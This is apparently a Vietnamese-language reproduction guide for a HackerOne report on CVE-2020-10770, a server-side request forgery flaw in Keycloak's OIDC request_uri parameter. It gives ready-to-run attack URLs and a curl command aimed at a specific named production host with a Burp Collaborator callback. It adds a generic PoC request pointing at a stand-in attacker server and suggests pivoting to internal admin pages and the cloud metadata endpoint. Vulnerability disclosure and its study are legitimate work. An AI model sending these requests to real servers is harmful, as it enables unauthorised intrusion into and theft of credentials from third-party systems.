# https://hackerone.com/reports/1379080

---

## 🧠 Tóm tắt CVE-2020-10770

Lỗi xảy ra do Keycloak **không xác minh URL được truyền vào tham số `request_uri`** khi xử lý các request OIDC. Điều này dẫn đến việc máy chủ có thể **gửi HTTP request đến địa chỉ tùy ý**, gây ra **SSRF (Server Side Request Forgery)**.

---

## 🔧 Các bước tái hiện tấn công

### 1️⃣ Môi trường cần thiết

* Một server vulnerable chạy Keycloak < 13.0.0 (ở đây là `https://sponsoredata.mtn.ci:8443`)
* Một công cụ trung gian để capture/tương tác như Burp Suite
* Một dịch vụ để nhận SSRF như **Burp Collaborator**, `interact.sh`, `canarytokens.org`, etc.

---

### 2️⃣ Craft HTTP Request chứa payload `request_uri`

URL tấn công:

```bash
https://sponsoredata.mtn.ci:8443/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://<collaborator-subdomain>
```

Trong PoC của renzi:

```bash
request_uri=http://0rs71imlpr20qx2svt6gfrotakga4z.burpcollaborator.net
```

---

### 3️⃣ Gửi request và kiểm tra tương tác SSRF

* Mở Burp Suite → Proxy → bật Intercept hoặc sử dụng curl:

```bash
curl -k "https://sponsoredata.mtn.ci:8443/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://0rs71imlpr20qx2svt6gfrotakga4z.burpcollaborator.net"
```

* Sau khi gửi, theo dõi **Burp Collaborator** để xem có **DNS / HTTP interaction** đến từ server Keycloak hay không.

---

## 💥 Ý nghĩa tấn công

SSRF dạng này có thể:

* Truy cập nội bộ (`http://127.0.0.1:8080/admin`)
* Đọc metadata cloud (VD: `http://169.254.169.254/latest/meta-data/`)
* Là pivot để tấn công các dịch vụ khác trong nội bộ (chained với RCE, LFI,...)

---

---

## 🧪 Proof of Concept (PoC) cấu trúc tổng quát

```http
GET /auth/realms/master/protocol/openid-connect/auth?
scope=openid&
response_type=code&
redirect_uri=https://valid-redirect.com&
state=randomState&
nonce=randomNonce&
client_id=security-admin-console&
request_uri=http://attacker-collaborator-server.com

Host: target.com
```

---
